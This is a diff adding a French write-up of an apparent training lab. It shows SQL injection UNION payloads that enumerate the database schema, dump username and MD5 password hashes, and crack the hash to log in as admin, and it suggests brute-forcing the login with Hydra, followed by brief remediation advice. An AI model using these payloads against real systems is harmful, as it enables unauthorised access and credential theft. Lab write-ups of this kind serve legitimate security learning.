@@ -1,0 +1,50 @@
+# Resolve
+
+## Lien
+http://10.11.200.162/?page=signin
+
+## Explication de la faille
+
+### Injection SQL
+
+Pour connaitre le nom de la base de donnee on utilise cette requete:
+`1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.columns`
+
+et le resultat qui nous interesse:
+```
+Title: db_default
+Url : Member_Brute_Force
+```
+
+Ensuite on va lister le nom des colonnes de db_default:
+`1 AND 1=2 UNION SELECT  table_name, column_name FROM information_schema.columns`
+
+Le resultat qui nous interesse:
+- db_default
+  - id
+  - username
+  - password
+
+On va ensuite lister username et password avec ca:
+`1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default`
+
+Resultat:
+```
+password: 3bf1114a986ba87ed28fc1b5884fc2f8
+username : root
+
+password: 3bf1114a986ba87ed28fc1b5884fc2f8
+username : admin
+```
+
+Les hash sont les meme, c'est du md5 qui signifie: shadow.
+
+Il suffit de se loguer dans la page Sign In: admin:shadow
+
+### Brute Force
+
+Utiliser un outils comme Hydra puis utiliser un dictionnaire de mot de passe basique sur la page connexion.
+
+## Correction
+
+Bloquer les injections SQL, forcer l'utilisation d'un mot de passe fort et bloquer au bout de 3 tentatives par exemple les connexions (voir fail2ban).
